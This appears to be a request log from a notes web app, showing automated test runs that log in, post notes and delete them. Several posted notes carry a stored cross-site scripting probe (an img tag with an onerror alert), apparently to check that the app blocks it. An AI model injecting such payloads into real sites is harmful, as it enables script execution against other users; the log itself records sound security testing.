+[2025-06-15T14:31:04.417Z] DELETE /notes/684ed815b4fcb417901d700b | No Body in Request
+[2025-06-15T14:31:06.739Z] OPTIONS /notes/684ed810b4fcb417901d6ffd | No Body in Request
+[2025-06-15T14:31:06.741Z] DELETE /notes/684ed810b4fcb417901d6ffd | No Body in Request
+[2025-06-15T14:31:07.598Z] OPTIONS /notes/684ed809b4fcb417901d6fef | No Body in Request
+[2025-06-15T14:31:07.600Z] DELETE /notes/684ed809b4fcb417901d6fef | No Body in Request
+[2025-06-15T14:31:08.357Z] OPTIONS /notes/684ed802b4fcb417901d6fe1 | No Body in Request
+[2025-06-15T14:31:08.360Z] DELETE /notes/684ed802b4fcb417901d6fe1 | No Body in Request
+[2025-06-15T14:31:27.063Z] GET /notes | No Body in Request
+[2025-06-15T14:31:27.199Z] OPTIONS /login | No Body in Request
+[2025-06-15T14:31:27.202Z] POST /login | Body: {"username":"s","password":"m"}
+[2025-06-15T14:31:27.439Z] GET /notes | No Body in Request
+[2025-06-15T14:31:27.437Z] GET /notes | No Body in Request
+[2025-06-15T14:31:27.443Z] GET /notes | No Body in Request
+[2025-06-15T14:31:27.445Z] GET /notes | No Body in Request
+[2025-06-15T14:31:27.920Z] OPTIONS /notes | No Body in Request
+[2025-06-15T14:31:27.923Z] POST /notes | Body: {"title":"XSS Test","content":"<img src=x onerror=\"alert('XSS');\" />","author":{"name":"spaiderMan","email":"spaider@man"}}
+[2025-06-15T14:31:28.980Z] OPTIONS /notes/684ed93fb4fcb417901d7028 | No Body in Request
+[2025-06-15T14:31:28.982Z] DELETE /notes/684ed93fb4fcb417901d7028 | No Body in Request
+[2025-06-15T14:31:29.622Z] GET /notes | No Body in Request
+[2025-06-15T14:31:29.746Z] OPTIONS /login | No Body in Request
+[2025-06-15T14:31:29.747Z] POST /login | Body: {"username":"s","password":"m"}
+[2025-06-15T14:31:29.981Z] GET /notes | No Body in Request
+[2025-06-15T14:31:29.985Z] GET /notes | No Body in Request
+[2025-06-15T14:31:29.984Z] GET /notes | No Body in Request
+[2025-06-15T14:31:29.987Z] GET /notes | No Body in Request
+[2025-06-15T14:31:30.415Z] OPTIONS /notes | No Body in Request
+[2025-06-15T14:31:30.417Z] POST /notes | Body: {"title":"XSS Blocked","content":"<img src=x onerror=\"alert('SHOULD NOT RUN');\" />","author":{"name":"spaiderMan","email":"spaider@man"}}
+[2025-06-15T14:31:31.462Z] OPTIONS /notes/684ed942b4fcb417901d7037 | No Body in Request
+[2025-06-15T14:31:31.464Z] DELETE /notes/684ed942b4fcb417901d7037 | No Body in Request
+[2025-06-15T14:31:36.206Z] GET /notes | No Body in Request
+[2025-06-15T14:31:36.542Z] GET /notes | No Body in Request
+[2025-06-15T14:31:36.546Z] GET /notes | No Body in Request
+[2025-06-15T14:31:36.550Z] GET /notes | No Body in Request
+[2025-06-15T14:31:36.554Z] GET /notes | No Body in Request
+[2025-06-15T14:31:54.696Z] GET /notes | No Body in Request
+[2025-06-15T14:31:54.883Z] OPTIONS /login | No Body in Request
+[2025-06-15T14:31:54.885Z] POST /login | Body: {"username":"s","password":"m"}
+[2025-06-15T14:31:55.124Z] GET /notes | No Body in Request
+[2025-06-15T14:31:55.127Z] GET /notes | No Body in Request
+[2025-06-15T14:31:55.131Z] GET /notes | No Body in Request
+[2025-06-15T14:31:55.133Z] GET /notes | No Body in Request
+[2025-06-15T14:31:55.667Z] OPTIONS /notes | No Body in Request
+[2025-06-15T14:31:55.670Z] POST /notes | Body: {"title":"XSS Test","content":"<img src=x onerror=\"alert('XSS');\" />","author":{"name":"spaiderMan","email":"spaider@man"}}
+[2025-06-15T14:31:56.713Z] OPTIONS /notes/684ed95bb4fcb417901d7050 | No Body in Request
+[2025-06-15T14:31:56.715Z] DELETE /notes/684ed95bb4fcb417901d7050 | No Body in Request
+[2025-06-15T14:31:57.350Z] GET /notes | No Body in Request
+[2025-06-15T14:31:57.481Z] OPTIONS /login | No Body in Request
+[2025-06-15T14:31:57.483Z] POST /login | Body: {"username":"s","password":"m"}
+[2025-06-15T14:31:57.719Z] GET /notes | No Body in Request
+[2025-06-15T14:31:57.721Z] GET /notes | No Body in Request
+[2025-06-15T14:31:57.724Z] GET /notes | No Body in Request
+[2025-06-15T14:31:57.726Z] GET /notes | No Body in Request
+[2025-06-15T14:31:58.248Z] OPTIONS /notes | No Body in Request
+[2025-06-15T14:31:58.250Z] POST /notes | Body: {"title":"XSS Blocked","content":"<img src=x onerror=\"alert('SHOULD NOT RUN');\" />","author":{"name":"spaiderMan","email":"spaider@man"}}
+[2025-06-15T14:31:59.312Z] OPTIONS /notes/684ed95eb4fcb417901d705f | No Body in Request
+[2025-06-15T14:31:59.314Z] DELETE /notes/684ed95eb4fcb417901d705f | No Body in Request
+[2025-06-15T14:32:06.701Z] GET /notes | No Body in Request
+[2025-06-15T14:32:07.033Z] GET /notes | No Body in Request
+[2025-06-15T14:32:07.038Z] GET /notes | No Body in Request
+[2025-06-15T14:32:07.041Z] GET /notes | No Body in Request
+[2025-06-15T14:32:07.043Z] GET /notes | No Body in Request
+[2025-06-15T14:32:14.819Z] GET /notes | No Body in Request
+[2025-06-15T14:32:14.980Z] OPTIONS /login | No Body in Request
+[2025-06-15T14:32:14.982Z] POST /login | Body: {"username":"s","password":"m"}
+[2025-06-15T14:32:15.251Z] GET /notes | No Body in Request
+[2025-06-15T14:32:15.249Z] GET /notes | No Body in Request
+[2025-06-15T14:32:15.253Z] GET /notes | No Body in Request
+[2025-06-15T14:32:15.256Z] GET /notes | No Body in Request
+[2025-06-15T14:32:15.828Z] OPTIONS /notes | No Body in Request
+[2025-06-15T14:32:15.830Z] POST /notes | Body: {"title":"XSS Test","content":"<img src=x onerror=\"alert('XSS');\" />","author":{"name":"spaiderMan","email":"spaider@man"}}
+[2025-06-15T14:32:16.878Z] OPTIONS /notes/684ed96fb4fcb417901d7078 | No Body in Request
+[2025-06-15T14:32:16.880Z] DELETE /notes/684ed96fb4fcb417901d7078 | No Body in Request
+[2025-06-15T14:32:17.528Z] GET /notes | No Body in Request
+[2025-06-15T14:32:17.680Z] OPTIONS /login | No Body in Request
+[2025-06-15T14:32:17.682Z] POST /login | Body: {"username":"s","password":"m"}
+[2025-06-15T14:32:17.936Z] GET /notes | No Body in Request
+[2025-06-15T14:32:17.938Z] GET /notes | No Body in Request
+[2025-06-15T14:32:17.941Z] GET /notes | No Body in Request
+[2025-06-15T14:32:17.943Z] GET /notes | No Body in Request
+[2025-06-15T14:32:18.460Z] OPTIONS /notes | No Body in Request
+[2025-06-15T14:32:18.462Z] POST /notes | Body: {"title":"XSS Blocked","content":"<img src=x onerror=\"alert('SHOULD NOT RUN');\" />","author":{"name":"spaiderMan","email":"spaider@man"}}
+[2025-06-15T14:32:19.511Z] OPTIONS /notes/684ed972b4fcb417901d7087 | No Body in Request
+[2025-06-15T14:32:19.513Z] DELETE /notes/684ed972b4fcb417901d7087 | No Body in Request
